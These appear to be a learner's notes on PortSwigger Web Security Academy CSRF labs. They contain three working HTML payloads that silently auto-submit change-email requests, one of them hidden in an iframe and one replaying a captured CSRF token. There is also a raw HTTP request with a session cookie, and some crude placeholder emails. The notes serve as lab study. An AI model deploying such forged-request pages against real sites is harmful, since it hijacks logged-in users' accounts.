
TLDR; Basically make a HTML page with the request thats being used, either it be `GET` or `POST`, in this case its a `POST` request on the `change-email` address  




Rana's payload!
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://0a6600de0409819e815417da00c5004a.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="wiener%40admin-user.net">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```
https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/csrf/lab-01/csrf-lab01.html

Portswigger!
```
<html>
    <body>
        <form action="https://0a12007204e4d8778023b8260031005d.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user-fuckyou.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

```




# Token validation


experiment

request
```
GET /my-account/change-email?email=pwned%40hello.com&csrf=WTR3924BH37khDwf7j1QiHEXDKPR933h HTTP/2
Host: 0a81005a04e2096587ab52b4008d004c.web-security-academy.net
Cookie: session=0sK7M2stFxvBxDqRlhNtlLalJqVqG4rb
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a81005a04e2096587ab52b4008d004c.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a81005a04e2096587ab52b4008d004c.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
```


payload
```
<html>
    <body>
        <form action="https://0a81005a04e2096587ab52b4008d004c.web-security-academy.net/my-account/change-email" method="GET">
            <input type="hidden" name="email" value="suckmydick@evil-user-fuckyou.net" />
            <input type="hidden" name="csrf" value="WTR3924BH37khDwf7j1QiHEXDKPR933h" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```



# 

---

# mistakes
# Lesson 1
Reading goes a long way saif you know that?
